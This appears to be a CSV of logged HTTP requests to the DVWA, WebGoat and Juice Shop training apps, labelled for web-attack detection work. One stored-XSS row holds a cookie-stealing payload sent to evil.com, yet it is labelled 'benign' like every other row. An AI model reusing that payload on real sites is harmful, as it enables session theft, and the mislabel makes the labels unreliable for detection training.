source_app,label,method,path,body,status_code,response_size
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '545'), ('name', 'Heather Clark')]",200,1929
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hello, Mark. It very prove may throughout police.",200,279
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Piece country time law unit cup toward tough product defense."", ""rating"": 5}",500,2236
webgoat,benign,GET,login,,200,1929
dvwa,benign,GET,/DVWA/vulnerabilities/open_redirect/,redirect=https://www.collins.com/,200,4809
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '387'), ('name', 'Robert Herrera')]",200,273
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hello, Michael. Catch operation which.",200,279
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Effort station politics item administration pressure meet moment thing company spend prove wall expert."", ""rating"": 5}",500,2236
dvwa,benign,GET,/DVWA/vulnerabilities/bac/,user_id=81,404,295
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/security.php,security=high&seclev_submit=Submit,302,0
webgoat,benign,GET,service/lessonmenu.mvc,,200,8444
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=phamdesiree&password=c^w0u1Ri^N&Login=Login&user_token=b259adbd270e1d6c6d06a1ec4b434c38,302,0
dvwa,benign,PUT,/DVWA/vulnerabilities/api/,<fall><between>Must mother actually.</wide><subject>Authority while land.</else><plant>Power each child side turn past treatment use.</enjoy></fall>,302,0
dvwa,benign,POST,/DVWA/security.php,security=impossible&seclev_submit=Submit,302,125
dvwa,benign,GET,/DVWA/vulnerabilities/bac/,search=Build manage best if.&limit=15&far=91211&war=kitchen&user_id=22,404,295
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=reedamanda&password=UOGiI!n*&2&Login=Login,302,155
webgoat,benign,POST,csrf/review,reviewText=Size mention allow several far determine evidence a charge perhaps live station million many anything.&submit=Submit,200,256
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Unit hope none company out charge too five everyone sing prevent billion woman ahead raise."", ""rating"": 1}",500,2236
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hello, Jessica. Change sure charge get.",200,279
dvwa,benign,GET,/DVWA/security.php,,200,5102
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hello, Jacqueline. Contain movement finally design far live guess former.",200,279
webgoat,benign,POST,csrf/review,reviewText=Television begin catch population require leg wind two ahead field newspaper prepare entire debate participant.&submit=Submit,200,256
dvwa,benign,GET,/DVWA/vulnerabilities/sqli/,,200,4621
dvwa,benign,GET,/DVWA/vulnerabilities/upload/,,200,4649
webgoat,benign,GET,service/lessonmenu.mvc,,200,8444
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=bryan94&password=ko2Kcm!CU%&Login=Login&user_token=053131205b3c144647726b984d8b0ee3,302,0
webgoat,benign,GET,mail,,200,3098
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Without bag probably center especially history world rather right fish of hospital American plant put writer claim protect either."", ""rating"": 4}",500,2236
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Start natural Congress speak indeed name change crime challenge ago."", ""rating"": 5}",500,2236
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '187'), ('name', 'Nichole Woodard')]",200,273
juiceshop,benign,GET,rest/products/search?q=stickerme,,200,30
dvwa,benign,POST,/DVWA/vulnerabilities/javascript/,token=1Cb0SppxnvBa68kOfu5WeUK5de1lEbaY,200,4840
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Different work decide face fly hour. Such threat amount fly member form. Themselves phone performance store management last gas. Deal weight prove challenge report power study. Finish of door your.,200,279
dvwa,benign,PATCH,/DVWA/instructions.php,"version=v5&client=Mozilla/5.0+(X11;+Linux+x86_64)+AppleWebKit/536.2+(KHTML,+like+Gecko)+Chrome/33.0.800.0+Safari/536.2&agent=192.115.215.119&current=385&identify=mother",200,41155
dvwa,benign,GET,/DVWA/vulnerabilities/weak_id/,api_key=4ff4ec13-2204-46c6-8d4f-f842ce5d053d&format=json&natural=620,200,3987
dvwa,benign,GET,/DVWA/about.php,user_id=6770&action=fall&region=mjones@example.org&wear=religious&wear=long&wear=program&wear=book&wear=technology,200,4049
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Face here administration question nation support in result business half nature."", ""rating"": 5}",500,2236
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,"q=break&page=1&political=['vote']&order={'nested': 'woman', 'count': 53, 'active': True}&username=djohnson&password=Y(7WkwOQ@f&Login=Login&category=tree&type=tonight&his=scientist",200,4819
dvwa,benign,GET,/DVWA/about.php,,200,5738
webgoat,benign,GET,mail,,200,3098
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hey Courtney, are we still on for the meeting?",200,1929
dvwa,benign,GET,/DVWA/vulnerabilities/fi/,page=file3.php,302,0
dvwa,benign,POST,/DVWA/vulnerabilities/captcha/,step=1&password_new=pass_VBpr9ZoB&password_conf=pass_v2ckYueB&passed_captcha=true&Change=Change&search=Area+kind+everybody+theory+idea.&limit=79&suddenly=19867&standard=331&operation=676&operation=511&operation=518,200,5441
webgoat,benign,GET,mail,,200,3098
dvwa,benign,GET,/DVWA/vulnerabilities/xss_r/,user_id=4853&action=guy&draw=187.186.40.45&name=Jamie_6rC8HFfG_safe,302,0
webgoat,benign,POST,csrf/review,"reviewText=In other words, the whatever certain really everything.&submit=Submit",200,256
dvwa,benign,GET,/DVWA/vulnerabilities/weak_id/,"start_date=2016-02-18&end_date=1981-03-18&model={'nested': 'door', 'count': 32, 'active': True}&clearly=clarkestephen@example.org&tonight=3786&lang=en&timezone=America/Tegucigalpa&bar=38121&by=UGFydGljaXBhbnQgc3Ry&big=137.44.231.151",200,4005
dvwa,benign,GET,/DVWA/vulnerabilities/captcha/,step=1&password_new=pass_MLHrRW0U&password_conf=pass_8Qv1wXcL&passed_captcha=true&Change=Change,302,0
webgoat,benign,POST,SqlInjection/attack8,name=Kathleen Mcdaniel&auth_tan=162,200,273
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Get one item herself visit probably recognize opportunity choose us range night maintain happen blue figure radio simply want."", ""rating"": 0}",500,2236
webgoat,benign,GET,welcome.mvc,,200,15601
dvwa,benign,GET,/DVWA/vulnerabilities/captcha/,,200,5480
webgoat,benign,POST,SqlInjection/attack8,name=Candice Valentine&auth_tan=952,200,273
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Miss east opportunity help determine eight increase middle possible where although tough firm bad else help general nothing."", ""rating"": 1}",500,2236
dvwa,benign,GET,/DVWA/README.pl.md,api_key=fc4d1f35-1c12-4449-b511-30cc905bb331&format=json&suggest=http://powers.org/,500,632
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Star number at expect enter air your guy tonight above item raise space than already soon."", ""rating"": 5}",500,2236
dvwa,benign,GET,/DVWA/vulnerabilities/brute/index.php,,200,4900
webgoat,benign,POST,SqlInjection/attack8,name=Johnny Martin&auth_tan=781,200,273
dvwa,benign,OPTIONS,/DVWA/vulnerabilities/open_redirect/,,200,4798
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Goal mother rise reality like plan. For water water wear defense spend.,200,279
dvwa,benign,POST,/DVWA/login.php,username=admin&password=password&Login=Login&user_token=73bb6af7eadd69994e5b02d415ea3b66,302,0
juiceshop,benign,GET,rest/products/search?q=raspberrythere,,200,30
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=rosecollins&password=%1W+oxgxMI&Login=Login&user_token=f015b65f686c4d8dd4f8dc826d598310,200,4800
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/vulnerabilities/sqli/,id=4995&Submit=Submit,200,4727
webgoat,benign,POST,SqlInjection/attack8,name=Susan Aguilar&auth_tan=978,200,273
webgoat,benign,POST,csrf/review,reviewText=Long company administration yes traditional challenge me food human sport.&submit=Submit,200,256
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=During agreement together event how onto. Age hit rich me to. Science ten kitchen source.,200,279
dvwa,benign,GET,/DVWA/about.php,category=eye,200,5734
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,GET,/DVWA/vulnerabilities/xss_s/,txtName=Leslie_TYeQJe_safe&mtxMessage=Member+system+report+serve.&btnSign=Sign+Guestbook,200,143232
dvwa,benign,GET,/DVWA/login.php,,200,1342
webgoat,benign,POST,SqlInjection/attack8,name=Zachary Jackson&auth_tan=802,200,273
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Security truth run price reason at room help present bar candidate reveal kitchen choice ten."", ""rating"": 2}",500,2236
juiceshop,benign,GET,rest/products/search?q=shirtterm,,200,30
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,username=woodbarbara&password=!^50ZMtn4v&Login=Login&filter=what&sort=desc,200,4773
dvwa,benign,GET,/DVWA/instructions.php,api_key=0c615ace-d982-4249-a20b-899f7335c1cf&format=json&style=senior&compare=13.149.239.34&us=6f3405c0-02cd-4da8-8197-23b0d8f87f7f&user_id=9141&action=kind&involve=nmartin@example.net&short=reach&short=win&short=loss,200,41154
dvwa,benign,GET,/DVWA/vulnerabilities/xss_r/index.php,,200,4964
webgoat,benign,POST,csrf/review,reviewText=I noticed the carry Congress available in spite of it was able.&submit=Submit,200,256
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,GET,/DVWA/index.php,,302,0
webgoat,benign,POST,SqlInjection/attack8,name=Bryan Bailey&auth_tan=202,200,273
webgoat,benign,GET,mail,,200,3098
juiceshop,benign,GET,rest/products/search?q=shirtspend,,200,30
webgoat,benign,POST,SqlInjection/attack8,name=Benjamin Hahn&auth_tan=507,200,273
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '963'), ('name', 'Jonathan Rodriguez')]",200,273
juiceshop,benign,GET,rest/products/search?q=owaspdream,,200,30
dvwa,benign,GET,/DVWA/vulnerabilities/open_redirect/,redirect=https://murray.org/,200,4813
webgoat,benign,POST,csrf/review,"reviewText=Conceptually, considering the fight, it install quite them.&submit=Submit",200,256
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Responsibility parent wonder drive everyone authority hit win worker community everybody or management involve."", ""rating"": 1}",500,2236
webgoat,benign,GET,mail,,200,3098
juiceshop,benign,GET,rest/products/search?q=raspberrymanag,,200,30
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Sometimes dark onto. Image head out two work analysis. Live choose foreign southern represent pass. Culture color political could.,200,279
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Compare hundred power mouth never support yet most bring rather number."", ""rating"": 1}",500,2236
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hello, Marcus. Boy follow third position create sense.",200,279
webgoat,benign,POST,csrf/review,reviewText=True record available whole modern treat sometimes station out edge area ten language.&submit=Submit,200,256
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Between hard Republican cold finally note head collection apply smile general hard keep work report career a tax late."", ""rating"": 0}",500,2236
webgoat,benign,GET,registration,,200,4188
webgoat,benign,GET,lessons,,404,14724
webgoat,benign,POST,SqlInjection/attack8,name=Ryan Frost&auth_tan=293,200,273
dvwa,benign,POST,/DVWA/security.php,security=high&seclev_submit=Submit&version=v4&client=Mozilla/5.0+(compatible;+MSIE+5.0;+Windows+98;+Win+9x+4.90;+Trident/4.1)&user_token=7985b9f6b84fa2d1703d7b95e9458e89,302,0
dvwa,benign,POST,/DVWA/vulnerabilities/csrf/,password_new=hacked_YYuaO7&password_conf=hacked_bmp6TP&Change=Change&user_token=362c3d550d3b18945b81a3cd5c36270d,200,6129
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,GET,/DVWA/vulnerabilities/bac/,user_id=69,404,295
dvwa,benign,GET,/DVWA/instructions.php,q=particular&page=15&order=nested&order=count&order=active,200,41161
dvwa,benign,GET,/DVWA/login.php,,200,1342
webgoat,benign,GET,start.mvc?id=33,,200,15601
dvwa,benign,POST,/DVWA/security.php,security=high&seclev_submit=Submit&user_id=1704&action=affect,302,0
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Do grow arrive series environmental wear live hard least off a although interview democratic save baby me church."", ""rating"": 1}",500,2236
dvwa,benign,POST,/DVWA/vulnerabilities/authbypass/,username=finleywilliam&password=v^)^H2BdRH&Login=Login,200,4519
dvwa,benign,GET,/DVWA/vulnerabilities/csrf/,,200,6129
webgoat,benign,GET,about.mvc,,404,14728
dvwa,benign,GET,/DVWA/vulnerabilities/xss_d/,default=French&category=leg&type=feeling&forget=nested&forget=count&forget=active&hotel=734&hotel=923,200,5178
webgoat,benign,POST,SqlInjection/attack8,name=Beth Goodman&auth_tan=749,200,273
dvwa,benign,GET,/DVWA/vulnerabilities/captcha/,step=1&password_new=pass_UDB8wqzZ&password_conf=pass_ZyQRgHrn&passed_captcha=true&Change=Change,200,5458
dvwa,benign,POST,/DVWA/vulnerabilities/api/,"{\x22query\x22: \x22Important media still choose.\x22, \x22filters\x22: {\x22option\x22: \x22character\x22, \x22thought\x22: \x22through\x22, \x22region\x22: \x22discover\x22}}",200,5713
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Clear born election couple have another order speak face almost a answer improve company."", ""rating"": 2}",500,2236
dvwa,benign,GET,/DVWA/vulnerabilities/xss_d/,debug=false&default=English,302,0
dvwa,benign,GET,/DVWA/vulnerabilities/brute/index.php,,200,4900
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Our paper read provide data friend seek author perhaps them avoid ball establish truth hold."", ""rating"": 5}",500,2236
juiceshop,benign,GET,rest/products/search?q=applefive,,200,30
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Thought understand something player indeed weight year myself thank decision easy and big receive wrong reach form citizen capital necessary challenge."", ""rating"": 0}",500,2236
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=gomezandrew&password=3kmSZwwm%%&Login=Login&user_token=a56446cc00668dcea3a5942172f780f3,200,4800
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Will list Congress action and. Natural hold although fund evidence. Green really doctor special. Everything billion democratic stay bar.,200,279
dvwa,benign,GET,/DVWA/vulnerabilities/upload/,"debug=true&he={'nested': 'good', 'count': 55, 'active': False}&Upload=Upload",200,4552
dvwa,benign,GET,/DVWA/security.php,security=medium&seclev_submit=Submit,200,5033
dvwa,benign,GET,/DVWA/vulnerabilities/sqli/,debug=true,200,4621
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/vulnerabilities/xss_s/,txtName=Nancy_MWSO3d_safe&mtxMessage=In+serious+my+themselves+collection+authority+view+address.&btnSign=Sign+Guestbook&start_date=2010-01-06&end_date=2011-01-11&star=2025-10-11T02:30:36.774033&bit=https://www.joseph-butler.com/&deep=83959,200,77592
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,username=mmendez&password=&)(9*WC6*s&Login=Login&lang=fr&timezone=Africa/Kampala&charge=105&charge=30&different=729&different=343&different=757&better=until&better=cut&better=scene,302,0
dvwa,benign,GET,/DVWA/vulnerabilities/upload/,,200,4546
juiceshop,benign,GET,rest/products/search?q=stickergun,,200,30
dvwa,benign,GET,/DVWA/login.php,,200,1388
dvwa,benign,GET,/DVWA/security.php,security=low&seclev_submit=Submit&lang=de&timezone=Europe/London&arm=618&arm=603&part=2025-10-11T12:21:45.440936&painting=prevent,302,0
dvwa,benign,GET,/DVWA/login.php,,200,1342
webgoat,benign,GET,lessons,,404,14724
dvwa,benign,GET,/DVWA/vulnerabilities/csrf/,password_new=newpass_zyXCTv&password_conf=newpass_hMM1lR&Change=Change&user_id=2784&action=time&draw=2025-10-10T20:10:16.149856&participant=RmVkZXJhbCBjb2xsZWN0,200,5953
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Dream that organization difference cause from according speak other impact large job suddenly would card."", ""rating"": 5}",500,2236
dvwa,benign,GET,/DVWA/vulnerabilities/upload/,,200,4649
dvwa,benign,GET,/DVWA/vulnerabilities/sqli_blind/,version=v4,200,4690
dvwa,benign,GET,/DVWA/vulnerabilities/csp/,include=jsonp,200,4702
dvwa,benign,GET,/DVWA/vulnerabilities/captcha/,step=1&password_new=pass_IJZCzPh1&password_conf=pass_Cgl7ASvc&passed_captcha=true&Change=Change,200,5480
webgoat,benign,POST,csrf/review,reviewText=Ball write positive son dog myself population argue defense hard growth imagine floor protect here together few oil history.&submit=Submit,200,256
dvwa,benign,GET,/DVWA/vulnerabilities/exec/,ip=38.17.170.168&Submit=Submit,200,4653
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,"version=v4&client=Mozilla/5.0 (Windows; U; Windows CE) AppleWebKit/532.37.2 (KHTML, like Gecko) Version/5.0 Safari/532.37.2&username=smithdawn&password=)rNC!lRL$3&Login=Login&version=v2&client=Mozilla/5.0+(iPhone;+CPU+iPhone+OS+14_2+like+Mac+OS+X)+AppleWebKit/536.2+(KHTML,+like+Gecko)+FxiOS/12.0p4231.0+Mobile/54Y574+Safari/536.2&suffer=poor&executive=79790&approach=nested&approach=count&approach=active",302,149
webgoat,benign,GET,start.mvc,,200,15601
juiceshop,benign,GET,rest/products/search?q=owasp,,200,8887
dvwa,benign,POST,/DVWA/security.php,security=low&seclev_submit=Submit&lang=en&timezone=Asia/Katmandu&user_token=b3963c4b516fbf6de3b56975baf58849,302,0
webgoat,benign,GET,welcome.mvc,,200,15601
dvwa,benign,GET,/DVWA/index.php,api_key=499b97c0-5c18-40d7-8940-89aa028c453f,200,6503
webgoat,benign,POST,register.mvc,username=pcarter69&password=5+bhOQkF&1&matchingPassword=M@7T*BBiwU&agree=agree,200,4265
webgoat,benign,POST,register.mvc,username=dgonzalez73&password=%8&GsqdkN#&matchingPassword=PkWn%3Clt&&agree=agree,200,4298
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '937'), ('name', 'Taylor Wu')]",200,273
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '351'), ('name', 'Melissa Wilson')]",200,273
dvwa,benign,GET,/DVWA/instructions.php,lang=en&timezone=Europe/Bucharest&hit=2025-10-11T06:47:31.905572,200,41155
webgoat,benign,GET,login,,200,1929
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Time prove require technology campaign yourself watch field tough improve TV piece production year event."", ""rating"": 1}",500,2236
dvwa,benign,GET,/DVWA/vulnerabilities/javascript/,token=IQ4iTy6Dlr6tEFyyMS4TexMa2zXVkE6o,200,4809
dvwa,benign,POST,/DVWA/vulnerabilities/exec/,ip=99.82.34.117&Submit=Submit,499,0
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Analysis do Mr personal offer story unit land event again."", ""rating"": 5}",500,2236
webgoat,benign,POST,csrf/review,reviewText=Day seem heavy research understand them game structure.&submit=Submit,200,256
webgoat,benign,POST,SqlInjection/attack8,name=Matthew Wheeler&auth_tan=227,200,273
dvwa,benign,GET,/DVWA/security.php,,302,0
dvwa,benign,POST,/DVWA/vulnerabilities/exec/,ip=149.106.229.169&Submit=Submit&lang=de&timezone=Pacific/Funafuti&star=nested&star=count&star=active&form=there&produce=https://nguyen-marquez.net/&user_token=f9db15bef8777a5b3e2eaa8022f6eb54,200,5231
dvwa,benign,GET,/DVWA/vulnerabilities/upload/index.php,,200,4730
webgoat,benign,POST,register.mvc,username=ichandler&password=UI6%7)OvIuY%&matchingPassword=UI6%7)OvIuY%&agree=agree,500,15744
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '240'), ('name', 'Chad Neal')]",200,273
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Building apply blood cup effect argue recently military ready."", ""rating"": 0}",500,2236
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '299'), ('name', 'Clarence Morris')]",200,273
dvwa,benign,GET,/DVWA/login.php,,200,1342
juiceshop,benign,GET,rest/products/search?q=juicecheck,,200,30
dvwa,benign,GET,/DVWA/login.php,,200,1342
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '500'), ('name', 'Ashley Flores')]",200,273
dvwa,benign,GET,/DVWA/login.php,,200,1342
juiceshop,benign,GET,rest/products/search?q=stickerevide,,200,30
juiceshop,benign,GET,rest/products/search?q=greentend,,200,30
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Whenever I succeed, the authority becomes different. Basically, the charge looks insecure.",200,279
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,username=michaelgarcia&password=^LeDEXRwX1&Login=Login&api_key=69a63abf-858b-4ad4-970e-0e288dc0ea78&format=json&court=67358,200,4773
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/vulnerabilities/authbypass/,username=christopher54&password=O2Jl3VRv_1&Login=Login,200,4519
dvwa,benign,POST,/DVWA/vulnerabilities/captcha/,step=1&password_new=pass_49pW8BSu&password_conf=pass_Bu99hyzJ&passed_captcha=true&Change=Change&user_token=b03abf89e94dca6dc721c40c8680a867,200,5782
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Population down key race per hair. Audience voice husband station seem. Provide well four market after family party.,200,279
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=johnperez&password=(g9Ua3c%pU&Login=Login&api_key=ccc740ff-30ce-4a1f-9d20-c6ca2da076e7&format=json&ground=29bc3045-47c8-4267-a2d6-06ac37986fad&teacher=9b882435-f0a2-48dd-87af-b6bf48587dd4&practice=http://calhoun.com/&user_token=dde4a7ab1eae8ee9577dcdce05b35f27,200,5024
dvwa,benign,GET,/DVWA/vulnerabilities/xss_r/,name=Christina_q8c4NIag_safe,302,155
webgoat,benign,POST,CrossSiteScripting/attack1,"text_area=Hello, Cheyenne. Finally base our really respond.",200,279
webgoat,benign,POST,SqlInjection/attack8,"[('auth_tan', '772'), ('name', 'James Best')]",200,273
juiceshop,benign,GET,rest/products/search?q=orangeeffor,,200,30
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Name college environment mouth soon decade poor put approach end."", ""rating"": 4}",500,2236
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Be test right. Can produce pressure marriage government event during moment. Effect involve evening present hit become.,200,279
webgoat,benign,POST,SqlInjection/attack8,name=Rebecca Sexton&auth_tan=721,200,273
dvwa,benign,GET,/DVWA/vulnerabilities/csp/,include=jsonp,200,4702
dvwa,benign,GET,/DVWA/vulnerabilities/sqli/,id=2656&Submit=Submit,302,154
webgoat,benign,POST,SqlInjection/attack8,name=Kevin Hernandez&auth_tan=843,200,273
dvwa,benign,GET,/DVWA/about.php,lang=es&debug=0&price=nested&price=count&price=active,200,5731
webgoat,benign,POST,SqlInjection/attack8,name=Douglas Cummings&auth_tan=757,200,273
webgoat,benign,GET,service/lessonmenu.mvc,,200,8444
dvwa,benign,GET,/DVWA/vulnerabilities/sqli/,,200,4621
dvwa,benign,PUT,/DVWA/vulnerabilities/api/,"{\x22settings\x22: {\x22theme\x22: \x22LightPink\x22, \x22notifications\x22: true}}",200,7119
webgoat,benign,POST,csrf/review,reviewText=Over over eight natural family also sound effort interview million movement their relate.&submit=Submit,200,256
juiceshop,benign,GET,rest/products/search?q=applemaybe,,200,30
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Break arrive outside message road evidence soon. At attorney short red. Look door present song. Action paper day plant. Design thought idea school onto look summer game.,200,279
dvwa,benign,GET,/DVWA/vulnerabilities/xss_r/,name=Laura_AmRdGv9J_safe&lang=fr&timezone=Africa/Douala&message=letter&message=inside&message=probably,302,155
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,username=gayeileen&password=+1KEM#c5sq&Login=Login&search=Drive+surface+expert+event+partner+only+suffer.&limit=37&stock=e84ecc01-f60a-4c14-95af-5f2d46735eed&better=past&relate=a9f893de-3394-4c2a-9bce-e1c5ab269823,302,0
dvwa,benign,POST,/DVWA/vulnerabilities/xss_s/,"txtName=data:text/html,<script>alert('XSS')</script>&mtxMessage=<img+src=""""+onerror=""this.src='http://evil.com/log.php?cookie='+document.cookie"">&btnSign=Sign+Guestbook&user_token=95329fae6e6d2e342c442698a90ba9da",200,240758
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Decide far west politics data. Assume whatever cell news. Receive price your. Now practice day kitchen baby father. Entire break ask wall suddenly.,200,279
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Mother system security assume administration account role section wonder thousand technology pick responsibility run anyone write."", ""rating"": 4}",500,2236
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,GET,/DVWA/login.php,,200,1342
webgoat,benign,POST,SqlInjection/attack8,name=Robin Jones&auth_tan=558,200,273
dvwa,benign,GET,/DVWA/vulnerabilities/brute/,username=davisdiane&password=90^FTlXX^n&Login=Login,302,149
webgoat,benign,GET,mail,,200,3098
dvwa,benign,GET,/DVWA/login.php,,200,1342
dvwa,benign,POST,/DVWA/vulnerabilities/upload/,--12938cfb098ce5520977b563206191b0\x0D\x0AContent-Disposition: form-data; name=\x22Upload\x22\x0D\x0A\x0D\x0AUpload\x0D\x0A--12938cfb098ce5520977b563206191b0\x0D\x0AContent-Disposition: form-data; name=\x22uploaded\x22; filename=\x22manager_do6eqD.png\x22\x0D\x0AContent-Type: image/png\x0D\x0A\x0D\x0A\x89PNG\x0D\x0A\x1A\x0A\x00\x00\x00\x0DIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xDECUhqSXIdfAmALORf0xP3abs1LVecGKXDhCSZRk50U2h4CjPt9d\x0D\x0A--12938cfb098ce5520977b563206191b0--\x0D\x0A,302,156
dvwa,benign,POST,/DVWA/vulnerabilities/sqli/,id=700&Submit=Submit&q=wind&page=11&else=nested&else=count&else=active&physical=466&physical=837&user_token=3f4e235178042082e5882834fa06db86,200,4727
dvwa,benign,GET,/DVWA/index.php,,302,0
dvwa,benign,GET,/DVWA/vulnerabilities/sqli/,,200,4621
webgoat,benign,GET,mail,,200,3098
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Federal machine American whom result argue beautiful. Cut model billion practice. Idea no only talk body. Paper wife stock cost safe reach. Education themselves perform machine future.,200,279
dvwa,benign,GET,/DVWA/vulnerabilities/csrf/,user_id=282&action=common,200,6006
webgoat,benign,POST,SqlInjection/attack8,name=Melissa West&auth_tan=949,200,273
dvwa,benign,GET,/DVWA/vulnerabilities/xss_s/,,200,24179
dvwa,benign,PUT,/DVWA/vulnerabilities/api/,"{\x22query\x22: \x22Class table thank play behavior rule control.\x22, \x22filters\x22: {\x22road\x22: \x22easy\x22, \x22enter\x22: \x22religious\x22, \x22record\x22: \x22address\x22}}",200,5713
dvwa,benign,POST,/DVWA/vulnerabilities/brute/,username=mprice&password=B0PeNFiw#W&Login=Login,302,155
webgoat,benign,GET,welcome.mvc,,200,15601
webgoat,benign,POST,csrf/review,reviewText=Attention toward during hundred assume teach responsibility control news thousand hand general activity age.&submit=Submit,200,256
webgoat,benign,POST,CrossSiteScripting/attack1,text_area=Standard clear general something concern our. Indeed member main reflect. Particular line speak someone wide say. Off his page most test heart. Old particularly new behind decide any.,200,279
juiceshop,benign,POST,api/Feedbacks/,"{""comment"": ""Important social me style public center enjoy show remember myself fine go resource."", ""rating"": 1}",500,2236
webgoat,benign,POST,register.mvc,username=tinarogers&password=(3JVuBUgi8v8&matchingPassword=(3JVuBUgi8v8&agree=agree,200,4326
webgoat,benign,POST,register.mvc,username=fsullivan&password=_x^&QsuTYH7A&matchingPassword=_x^&QsuTYH7A&agree=agree,200,4307
